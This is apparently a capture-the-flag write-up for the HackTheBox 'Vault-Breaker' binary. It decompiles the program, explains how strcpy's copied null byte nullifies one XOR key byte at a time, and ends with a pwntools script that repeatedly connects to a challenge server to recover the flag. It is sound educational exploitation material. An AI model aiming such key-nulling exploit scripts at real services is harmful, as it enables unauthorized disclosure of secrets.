---
layout: post
title: Binary Exploitation&#58; HacktheBox/Vault-Breaker Write-up
---

## HacktheBox Vault-Breaker Write-up

This was a pretty simply challenge that is centered around the ```strcpy``` function.

First, we need to check the file type and securities on the binary
```
└─$ file vault-breaker
vault-breaker: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./.glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26386d5d416b0017bc57216179a3fb116fa78667, not stripped
```
```
└─$ checksec --file=vault-breaker                                                
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   90 Symbols	  No	0		5		vault-breaker
```

With a canary, NX, and PIE, we won't be able to (or at least easily) do a buffer overflow or shellcode injection. Time to see what it looks like in ghidra.

### Reversing

First, let's check the ```main``` function.
```c
void main(void)

{
  long lVar1;
  
  setup();
  banner();
  key_gen();
  fprintf(stdout,"%s\n[+] Random secure encryption key has been generated!\n%s",&DAT_00103142,
          &DAT_001012f8);
  fflush(stdout);
  while( true ) {
    while( true ) {
      printf(&DAT_00105160,&DAT_001012f8);
      lVar1 = read_num();
      if (lVar1 != 1) break;
      new_key_gen();
    }
    if (lVar1 != 2) break;
    secure_password();
  }
  printf("%s\n[-] Invalid option, exiting..\n",&DAT_00101300);
                    /* WARNING: Subroutine does not return */
  exit(0x45);
}
```

The program generates a random key value in the ```key_gen()``` function and then prompts the user for a menu choice. The options are ```1``` for generate a new key and ```2``` to "secure" the password.

Now we need to look at the ```new_key_gen``` function.
```c
void new_key_gen(void)

{
  int iVar1;
  FILE *__stream;
  long in_FS_OFFSET;
  ulong local_60;
  ulong local_58;
  char local_48 [40];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_60 = 0;
  local_58 = 0x22;
  __stream = fopen("/dev/urandom","rb");
  if (__stream == (FILE *)0x0) {
    fprintf(stdout,"\n%sError opening /dev/urandom, exiting..\n",&DAT_00101300);
                    /* WARNING: Subroutine does not return */
    exit(0x15);
  }
  while (0x1f < local_58) {
    printf("\n[*] Length of new password (0-%d): ",0x1f);
    local_58 = read_num();
  }
  memset(local_48,0,0x20);
  iVar1 = fileno(__stream);
  read(iVar1,local_48,local_58);
  for (; local_60 < local_58; local_60 = local_60 + 1) {
    while (local_48[local_60] == '\0') {
      iVar1 = fileno(__stream);
      read(iVar1,local_48 + local_60,1);
    }
  }
  strcpy(random_key,local_48);
  fclose(__stream);
  printf("\n%s[+] New key has been genereated successfully!\n%s",&DAT_00103142,&DAT_001012f8);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

This function essentially generates a new key of the length provided by the user. The vulnerability is in the ```strcpy``` function. ```strcpy``` takes the contents of ```arg[1]``` and copies them into ```arg[0]```. The catch is, that it will copy the null terminator as well. This will be an important detail in the next function we take a look at, ```secure_password```.
```c
void secure_password(void)

{
  char *__buf;
  int __fd;
  ulong uVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char acStack136 [24];
  undefined8 uStack112;
  int local_68;
  int local_64;
  char *local_60;
  undefined8 local_58;
  char *local_50;
  FILE *local_48;
  undefined8 local_40;
  
  local_40 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  uStack112 = 0x100c26;
  puts("\x1b[1;34m");
  uStack112 = 0x100c4c;
  printf(&DAT_00101308,&DAT_001012f8,&DAT_00101300,&DAT_001012f8);
  local_60 = &DAT_00101330;
  local_64 = 0x17;
  local_58 = 0x16;
  local_50 = acStack136;
  memset(acStack136,0,0x17);
  local_48 = fopen("flag.txt","rb");
  __buf = local_50;
  if (local_48 == (FILE *)0x0) {
    fprintf(stderr,"\n%s[-] Error opening flag.txt, contact an Administrator..\n",&DAT_00101300);
                    /* WARNING: Subroutine does not return */
    exit(0x15);
  }
  sVar2 = (size_t)local_64;
  __fd = fileno(local_48);
  read(__fd,__buf,sVar2);
  fclose(local_48);
  puts(local_60);
  fwrite("\nMaster password for Vault: ",1,0x1c,stdout);
  local_68 = 0;
  while( true ) {
    uVar1 = (ulong)local_68;
    sVar2 = strlen(local_50);
    if (sVar2 <= uVar1) break;
    putchar((int)(char)(random_key[local_68] ^ local_50[local_68]));
    local_68 = local_68 + 1;
  }
  puts("\n");
                    /* WARNING: Subroutine does not return */
  exit(0x1b39);
}
```

This function looks like a lot, but the salient detail is in this code block:
```c
  while( true ) {
    uVar1 = (ulong)local_68;
    sVar2 = strlen(local_50);
    if (sVar2 <= uVar1) break;
    putchar((int)(char)(random_key[local_68] ^ local_50[local_68]));
    local_68 = local_68 + 1;
  }
```

The flag is XORed with our key. Using the information we gathered previously about the nature of the ```strcpy``` function and the fact that anything XORed with 0 is equal to itself, we can put together the flag one character at a time.

### Pwn

To complete this challenge, we need a script that will connect to the target and input a key length 32 times from 0 to 31 (The key length is 32 bytes).
```python
#!/usr/bin/env  python3

from pwn import *

flag = ""

for i in range(23):
    p = remote("209.97.134.177", 31320) 
    p.recvuntil(b"> ", timeout=30)
    p.sendline(b"1")
    p.recvuntil(b"Length of new password (0-31): ", timeout=30)
    p.sendline(str(i))
    p.recvuntil(b"> ", timeout=30)
    p.sendline(b"2")

    # Capture response
    p.recvuntil(b"Vault: ", timeout=30)
    r = p.recvline()

    # Append unencrypted character to flag
    flag += chr(r[i])
    p.close()
    print(flag)
```

Et Voila!
